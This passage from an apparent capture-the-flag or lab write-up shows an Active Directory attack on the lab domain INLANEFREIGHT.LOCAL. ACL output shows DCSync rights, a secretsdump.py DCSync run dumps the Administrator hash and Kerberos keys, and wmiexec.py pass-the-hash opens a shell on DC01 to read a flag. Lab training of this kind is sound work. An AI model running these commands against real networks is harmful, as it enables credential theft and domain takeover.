ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-All
```

`DCSync` rights

Perform a DCSync attack to obtain the hash for for administrator on DC01:

```
proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49667-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
[*] Cleaning up...
```


Use wmiexec.py as administrator and pass the hash aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 
to be able to connect to DC01. The flag is in C:\users\administrator\desktop\flag.txt:

```
proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49774-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC01

C:\>type c:\users\administrator\desktop\flag.txt
r3plicat1on_m@st3r!
```


























